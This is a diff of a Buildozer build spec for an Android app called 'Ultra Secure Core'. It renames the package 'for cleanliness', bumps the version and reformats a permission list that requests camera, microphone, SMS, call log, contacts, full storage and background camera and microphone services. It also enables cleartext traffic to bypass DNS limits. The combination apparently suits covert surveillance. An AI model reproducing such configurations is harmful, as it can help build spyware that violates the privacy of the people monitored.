@@ -2,9 +2,9 @@
 
 # ====== هوية التطبيق الجديدة (لا تتعارض مع أي نسخة سابقة) ======
 title = Ultra Secure Core
-package.name = com.ultra.secure.core.v5
+package.name = com.ultra.secure.v6          # تم تغيير الاسم لضمان نظافة كاملة
 package.domain = ultra.secure
-version = 5.0.0
+version = 5.0.2                              # إصدار أعلى
 
 # ====== المصادر والملفات ======
 source.dir = .
@@ -18,29 +18,8 @@ requirements = python3, kivy==2.3.0, requests, urllib3, certifi, pillow, pyjnius
 # ====== أيقونة التطبيق ======
 icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
-# ====== صلاحيات Android (شاملة لجميع الوظائف) ======
-android.permissions = \
-    INTERNET, \
-    ACCESS_NETWORK_STATE, \
-    ACCESS_WIFI_STATE, \
-    CAMERA, \
-    RECORD_AUDIO, \
-    WAKE_LOCK, \
-    FOREGROUND_SERVICE, \
-    POST_NOTIFICATIONS, \
-    REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, \
-    MANAGE_EXTERNAL_STORAGE, \
-    READ_EXTERNAL_STORAGE, \
-    WRITE_EXTERNAL_STORAGE, \
-    READ_MEDIA_IMAGES, \
-    READ_MEDIA_VIDEO, \
-    READ_MEDIA_AUDIO, \
-    READ_CONTACTS, \
-    READ_SMS, \
-    READ_CALL_LOG, \
-    FOREGROUND_SERVICE_DATA_SYNC, \
-    FOREGROUND_SERVICE_CAMERA, \
-    FOREGROUND_SERVICE_MICROPHONE
+# ====== صلاحيات Android – كتابة سطر واحد فقط (تم إصلاح التنسيق) ======
+android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CAMERA,RECORD_AUDIO,WAKE_LOCK,FOREGROUND_SERVICE,POST_NOTIFICATIONS,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,MANAGE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_MEDIA_IMAGES,READ_MEDIA_VIDEO,READ_MEDIA_AUDIO,READ_CONTACTS,READ_SMS,READ_CALL_LOG,FOREGROUND_SERVICE_DATA_SYNC,FOREGROUND_SERVICE_CAMERA,FOREGROUND_SERVICE_MICROPHONE
 
 # ====== إعدادات SDK/NDK (متوافقة مع Android 14) ======
 android.api = 34
@@ -49,6 +28,7 @@ android.sdk = 34
 android.ndk = 25b
 android.build_tools_ver = 34.0.0
 android.accept_sdk_license = True
+android.manifest_merging = True               # تمت الإضافة لضمان دمج المانيفست بشكل صحيح
 
 # مسارات الأدوات الثابتة (لـ GitHub Actions)
 android.sdk_path = /usr/local/lib/android/sdk
@@ -61,7 +41,7 @@ android.archs = arm64-v8a
 # ====== إعدادات الشبكة والتخزين ======
 android.allow_backup = False
 android.request_legacy_external_storage = True
-android.uses_cleartext_traffic = True   # لتجاوز بعض قيود DNS
+android.uses_cleartext_traffic = True         # لتجاوز بعض قيود DNS
 
 # ====== خدمات الخلفية والطاقة ======
 android.foreground = True
